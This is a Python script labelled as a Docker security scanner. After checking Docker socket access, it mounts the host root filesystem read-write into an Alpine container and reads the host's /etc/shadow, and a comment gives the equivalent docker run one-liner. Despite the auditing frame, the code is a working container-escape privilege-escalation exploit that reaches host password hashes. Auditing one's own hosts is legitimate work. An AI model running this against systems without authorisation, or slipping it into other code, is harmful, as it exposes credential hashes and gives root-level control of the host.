import docker
import os
import sys
import getpass

class DockerSecurityScanner:
    def __init__(self):
        self.user = getpass.getuser()
        self.client = None
        print(f"[*] Starting scan for user: {self.user}")

    def step_1_check_socket_access(self):
        """
        Tries to connect to the Docker Daemon.
        If this fails, the user probably isn't in the docker group or docker isn't running.
        """
        print("\n[1] Checking Docker Socket Access...")
        try:
            self.client = docker.from_env()
            self.client.ping()
            print("    [!] SUCCESS: Connected to Docker Daemon.")
            print("    [!] WARNING: This user has access to the Docker socket.")
            return True
        except docker.errors.DockerException as e:
            print(f"    [-] SECURE (or Error): Cannot connect to Docker Daemon.")
            print(f"    [-] Details: {e}")
            return False

    def step_2_privilege_escalation_test(self):
        """
        The 'Active' test.
        1. Pulls a tiny image (Alpine).
        2. Mounts the HOST root (/) to /host_mount inside the container.
        3. Tries to read the host's /etc/shadow file.
        """
        print("\n[2] Testing Privilege Escalation (Host Volume Mount)...")
        
        if not self.client:
            print("    [-] SKIPPING: No socket access.")
            return

        try:
            print("    [*] Attempting to mount host root '/' into a container...")
            
            # This is the python equivalent of:
            # docker run --rm -v /:/host_mount alpine cat /host_mount/etc/shadow
            container_output = self.client.containers.run(
                image="alpine:latest",
                command="cat /host_mount/etc/shadow",
                remove=True,
                volumes={
                    '/': {'bind': '/host_mount', 'mode': 'rw'}
                }
            )
            
            output_str = container_output.decode('utf-8')

            # Check if we successfully grabbed the shadow file
            if "root:" in output_str:
                print("    [!!!] CRITICAL VULNERABILITY CONFIRMED [!!!]")
                print("    [!] This user can read/write root files on the host.")
                print("    [!] Proof: Successfully read first line of host /etc/shadow.")
            else:
                print("    [?] Inconclusive. Container ran, but file read failed.")

        except docker.errors.ImageNotFound:
            print("    [-] Error: Alpine image not found. Run 'docker pull alpine' first.")
        except docker.errors.APIError as e:
            if "permission denied" in str(e).lower():
                print("    [+] SECURE: Docker daemon blocked the root mount (possibly using User Namespaces).")
            else:
                print(f"    [-] API Error: {e}")
        except Exception as e:
            print(f"    [-] Error: {e}")

if __name__ == "__main__":
    scanner = DockerSecurityScanner()
    
    if scanner.step_1_check_socket_access():
        scanner.step_2_privilege_escalation_test()
    else:
        print("\n[*] Scan complete. User does not appear to have Docker access.")